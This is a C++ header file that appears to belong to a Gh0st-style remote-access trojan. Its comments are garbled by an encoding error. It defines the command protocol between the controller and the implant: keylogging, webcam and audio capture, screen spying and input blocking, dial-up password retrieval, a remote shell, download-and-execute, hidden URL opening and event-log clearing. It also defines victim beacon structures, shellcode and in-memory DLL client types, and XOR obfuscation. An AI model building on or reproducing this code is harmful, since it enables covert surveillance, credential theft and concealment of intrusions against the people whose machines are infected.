#pragma once

#include <vector>
#include <string>
#include <iosfwd>
#include <iostream>
#include <sstream>
#include <string.h>
#include <map>
#include <numeric> 
#include <ctime>
#include <chrono>

#ifdef _WIN32
#include <concrt.h>
#include <corecrt_io.h>
#define MVirtualFree(a1, a2, a3) VirtualFree(a1, a2, a3)
#define MVirtualAlloc(a1, a2, a3, a4) VirtualAlloc(a1, a2, a3, a4)
#else // ʹ�ø�ͷ�ļ��� LINUX ����ʹ��
#include <thread>
#define strcat_s strcat
#define sprintf_s sprintf
#define strcpy_s strcpy
#define __stdcall 
#define WINAPI 
#define TRUE 1
#define FALSE 0
#define skCrypt(p)
#define Mprintf printf
#define ASSERT(p)
#define AUTO_TICK_C(p)
#define AUTO_TICK(p)
#define OutputDebugStringA(p) printf(p)

#include <unistd.h>
#define Sleep(n) ((n) >= 1000 ? sleep((n) / 1000) : usleep((n) * 1000))

typedef int64_t __int64;
typedef uint32_t DWORD;
typedef int BOOL, SOCKET;
typedef unsigned int ULONG;
typedef unsigned int UINT;
typedef void VOID;
typedef unsigned char BYTE;
typedef BYTE* PBYTE, * LPBYTE;
typedef void* LPVOID, * HANDLE;

#define GET_PROCESS(a1, a2) 
#define MVirtualFree(a1, a2, a3) delete[]a1
#define MVirtualAlloc(a1, a2, a3, a4) new BYTE[a2]
#define CopyMemory memcpy
#define MoveMemory memmove

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket close
#define CloseHandle(p)
#define CancelIo(p) close(reinterpret_cast<intptr_t>(p))
#endif

#include <string>
#include <vector>
#include <time.h>

#ifndef _MAX_PATH
#define _MAX_PATH 260
#endif

// ����2��������ȫ��Ψһ�����������ɷ���ʱ�������

#define FLAG_FINDEN "Hello, World!"

#define FLAG_GHOST	FLAG_FINDEN

// �����������Է����仯ʱ��Ӧ�ø������ֵ���Ա�Ա��س����������
#define DLL_VERSION __DATE__		// DLL�汾

#define TALK_DLG_MAXLEN 1024		// ��������ַ�����

// ����ö���б�
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������

	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�

	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_SERVICES,				// �������
	COMMAND_REGEDIT,
	COMMAND_TALK,					// ��ʱ��Ϣ��֤
	COMMAND_UPDATE = 53,			// �ͻ�������

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣

	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������

	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������

	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������

	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ
	TOKEN_SERVERLIST,               // �����б�
	COMMAND_SERVICELIST,            // ˢ�·����б�        
	COMMAND_SERVICECONFIG,          // ����˷����ı�ʶ
	TOKEN_TALK_START,				// ��ʱ��Ϣ��ʼ
	TOKEN_TALKCMPLT,				// ��ʱ��Ϣ���ط�
	TOKEN_KEYFRAME=134,				// �ؼ�֡

	TOKEN_REGEDIT = 200,            // ע���
	COMMAND_REG_FIND,				// ע��� �����ʶ
	TOKEN_REG_KEY,
	TOKEN_REG_PATH,
	COMMAND_BYE,					// ���ض��˳�
	SERVER_EXIT=205,				// ���ض��˳�

	SOCKET_DLLLOADER=210,           // �ͻ�������DLL
	CMD_DLLDATA,                    // ��ӦDLL����
	CMD_MASTERSETTING = 215,		// ��������
	CMD_HEARTBEAT_ACK = 216,		// ������Ӧ
};

enum 
{
	CLIENT_TYPE_DLL = 0,			// �ͻ��˴�����DLL����
	CLIENT_TYPE_ONE = 1,			// �ͻ��˴����Ե���EXE����
	CLIENT_TYPE_MEMEXE = -1,		// �ڴ�EXE����
	CLIENT_TYPE_MODULE = 2,			// DLL�����ⲿ�������
	CLIENT_TYPE_SHELLCODE = 4,		// Shellcode
	CLIENT_TYPE_MEMDLL = 5,			// �ڴ�DLL����
	CLIENT_TYPE_LINUX = 6,			// LINUX �ͻ���
};

inline const char* GetClientType(int typ) {
	switch (typ)
	{
	case CLIENT_TYPE_DLL:
		return "DLL";
	case CLIENT_TYPE_ONE:
		return "EXE";
	case CLIENT_TYPE_MEMEXE:
		return "MEXE";
	case CLIENT_TYPE_MODULE:
		return "DLL";
	case CLIENT_TYPE_SHELLCODE:
		return "SC";
	case CLIENT_TYPE_MEMDLL:
		return "MDLL";
	case CLIENT_TYPE_LINUX:
		return "LNX";
	default:
		return "DLL";
	}
}

// �����ӵ����س�����Ϣ
typedef struct CONNECT_ADDRESS
{
public:
	char	        szFlag[32];
	char			szServerIP[100];
	char			szPort[8];
	int				iType;
	bool            bEncrypt;
	char            szBuildDate[12];
	int             iMultiOpen;
	char            szReserved[134]; // ռλ��ʹ�ṹ��ռ��300�ֽ�

public:
	void SetType(int typ) {
		iType = typ;
	}
	const void* Flag() const {
		return szFlag;
	}
	int FlagLen() const {
		return strlen(szFlag);
	}
	const char* ServerIP()const {
		return szServerIP;
	}
	int ServerPort()const {
		return atoi(szPort);
	}
	int ClientType()const {
		return iType;
	}
	void SetServer(const char* ip, int port) {
		strcpy_s(szServerIP, ip);
		sprintf_s(szPort, "%d", port);
	}
	bool IsValid()const {
		return strlen(szServerIP) != 0 && atoi(szPort) > 0;
	}
	int Size() const {
		return sizeof(CONNECT_ADDRESS);
	}
} CONNECT_ADDRESS ;

// �������ߺ��͵ļ������Ϣ
// �˽ṹ��һ�������仯�������С��������ǰ�汾�Ŀͻ����޷������°�����.
// �°�ͻ���Ҳ�޷������ϰ汾�����س���.
// Ϊ�ˣ���20241228�ύ������Ϊ����ṹ��Ԥ���ֶΣ��Ա�δ��֮��ʱ֮��
// �������޸Ĵ˽ṹ�壬������������ټ�����ǰ�ĳ�����ߵ�����д����������
typedef struct  LOGIN_INFOR
{
	unsigned char			bToken;									// 1.��½��Ϣ
	char					OsVerInfoEx[156];						// 2.�汾��Ϣ
	unsigned int			dwCPUMHz;								// 3.CPU��Ƶ
	char					moduleVersion[24];						// 4.DLLģ��汾
	char					szPCName[_MAX_PATH];					// 5.������
	int						bWebCamIsExist;							// 6.�Ƿ�������ͷ
	unsigned int			dwSpeed;								// 7.����
	char					szStartTime[20];						// 8.����ʱ��
	char					szReserved[512];						// 9.�����ֶ�

	LOGIN_INFOR(){
		memset(this, 0, sizeof(LOGIN_INFOR));
		bToken = TOKEN_LOGIN;
		strcpy_s(moduleVersion, DLL_VERSION);
	}
	LOGIN_INFOR& Speed(unsigned long speed) {
		dwSpeed = speed;
		return *this;
	}
}LOGIN_INFOR;

// �̶�1024�ֽ�
typedef struct Heartbeat
{
	uint64_t Time;
	char ActiveWnd[512];
	int Ping;
	int HasSoftware;
	char Reserved[496];

	Heartbeat() {
		memset(this, 0, sizeof(Heartbeat));
	}
	Heartbeat(const std::string& s, int ping = 0) {
		auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
			std::chrono::system_clock::now()
			);
		Time = system_ms.time_since_epoch().count();
		strcpy_s(ActiveWnd, s.c_str());
		Ping = ping;
		memset(Reserved, 0, sizeof(Reserved));
	}
	int Size() const {
		return sizeof(Heartbeat);
	}
}Heartbeat;

typedef struct HeartbeatACK {
	uint64_t Time;
	char Reserved[24];
}HeartbeatACK;

// �̶�500�ֽ�
typedef struct MasterSettings {
	int         ReportInterval;             // �ϱ����
	int         Is64Bit;                    // �����Ƿ�64λ
	char        MasterVersion[12];          // ���ذ汾
	int			DetectSoftware;				// ������
	char        Reserved[476];              // Ԥ��
}MasterSettings;

enum 
{
	SOFTWARE_CAMERA = 0,
	SOFTWARE_TELEGRAM,

	SHELLCODE = 0,
	MEMORYDLL = 1,
};

typedef DWORD(__stdcall* PidCallback)(void);

inline const char* EVENTID(PidCallback pid) {
	static char buf[64] = { 0 };
	if (buf[0] == 0) {
		sprintf_s(buf, "SERVICE [%d] FINISH RUNNING", pid());
	}
	return buf;
}

#define EVENT_FINISHED EVENTID(GetCurrentProcessId)

inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<char>& keys) {
	for (char key : keys) {
		for (int i = 0; i < len; ++i) {
			data[i] ^= key;
		}
	}
}

inline std::tm ToPekingTime(const time_t* t) {
	// ��ȡ��ǰʱ�䣨��������ָ��Ϊ�գ�
	std::time_t now = (t == nullptr) ? std::time(nullptr) : *t;

	// �̰߳�ȫ��ת��Ϊ UTC ʱ��
	std::tm utc_time{};

#ifdef _WIN32  // Windows ʹ�� gmtime_s
	if (gmtime_s(&utc_time, &now) != 0) {
		return { 0, 0, 0, 1, 0, 100 }; // ʧ��ʱ���� 2000-01-01 00:00:00
	}
#else  // Linux / macOS ʹ�� gmtime_r
	if (gmtime_r(&now, &utc_time) == nullptr) {
		return { 0, 0, 0, 1, 0, 100 };
	}
#endif

	// ת��Ϊ����ʱ�䣨UTC+8��
	utc_time.tm_hour += 8;

	// �淶��ʱ�䣨�������������죩
	std::mktime(&utc_time);

	return utc_time;
}

inline std::string ToPekingTimeAsString(const time_t* t) {
	auto pekingTime = ToPekingTime(t);
	char buffer[20];
	std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &pekingTime);
	return buffer;
}

#ifdef _DEBUG
// Ϊ�˽��Զ��������Ļ�������������ĺ꣬������ʱʹ�ã���ʽ�汾û��
#define SCREENYSPY_IMPROVE 0
#define SCREENSPY_WRITE 0
#endif

#ifdef _WIN32

#ifdef _WINDOWS
#include <afxwin.h>
#else
#define WIN32_LEAN_AND_MEAN 
#include <windows.h>
#endif

// ���ڴ��е�λͼд���ļ�
inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::string& filePrefix, int index = -1) {
	char path[_MAX_PATH];
	if (filePrefix.size() >= 4 && filePrefix.substr(filePrefix.size() - 4) == ".bmp") {
		strcpy_s(path, filePrefix.c_str());
	}
	else {
		sprintf_s(path, ".\\bmp\\%s_%d.bmp", filePrefix.c_str(), index == -1 ? clock() : index);
	}
	FILE* File = fopen(path, "wb");
	if (File) {
		BITMAPFILEHEADER fileHeader = { 0 };
		fileHeader.bfType = 0x4D42; // "BM"
		fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo->bmiHeader.biSizeImage;
		fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		fwrite(&fileHeader, 1, sizeof(BITMAPFILEHEADER), File);
		fwrite(&bmpInfo->bmiHeader, 1, sizeof(BITMAPINFOHEADER), File);
		fwrite(bmpData, 1, bmpInfo->bmiHeader.biSizeImage, File);
		fclose(File);
		return true;
	}
	return false;
}

class MSG32 { // �Զ��������Ϣ(32λ)
public:
	uint32_t            hwnd;
	uint32_t            message;
	uint32_t            wParam;
	uint32_t            lParam;
	uint32_t            time;
	POINT               pt;

	MSG32(const void* buffer, int size) {
		if (size == sizeof(MSG32)) {
			memcpy(this, buffer, sizeof(MSG32));
		}
		else {
			memset(this, 0, sizeof(MSG32));
		}
	}

	MSG32() {
		memset(this, 0, sizeof(MSG32));
	}

	MSG32* Create(const void* buffer, int size) {
		if (size == sizeof(MSG32)) {
			memcpy(this, buffer, sizeof(MSG32));
		}
		else {
			memset(this, 0, sizeof(MSG32));
		}
		return this;
	}
};

// Windows �Զ������ϢMSG��32λ��64λϵͳ�´�С��ͬ�����¿�ƽ̨�ܹ�Զ�̿����쳣
// ��Ҫʹ���Զ������Ϣ(ͳһ����64λwindows ��MSG����)
class MSG64 { // �Զ��������Ϣ(64λ)
public:
	uint64_t            hwnd;
	uint64_t            message;
	uint64_t            wParam;
	uint64_t            lParam;
	uint64_t            time;
	POINT               pt;

	MSG64(const MSG& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
		lParam(msg.lParam), time(msg.time), pt(msg.pt) {}

	MSG64(const MSG32& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
		lParam(msg.lParam), time(msg.time), pt(msg.pt) {}

	MSG64(const void* buffer, int size) {
		if (size == sizeof(MSG64)) {
			memcpy(this, buffer, sizeof(MSG64));
		}
		else {
			memset(this, 0, sizeof(MSG64));
		}
	}

	MSG64() {
		memset(this, 0, sizeof(MSG64));
	}

	MSG64* Create(const MSG32* msg32) {
		hwnd = msg32->hwnd;
		message = msg32->message;
		wParam = msg32->wParam;
		lParam = msg32->lParam;
		time = msg32->time;
		pt = msg32->pt;
		return this;
	}
};

#endif
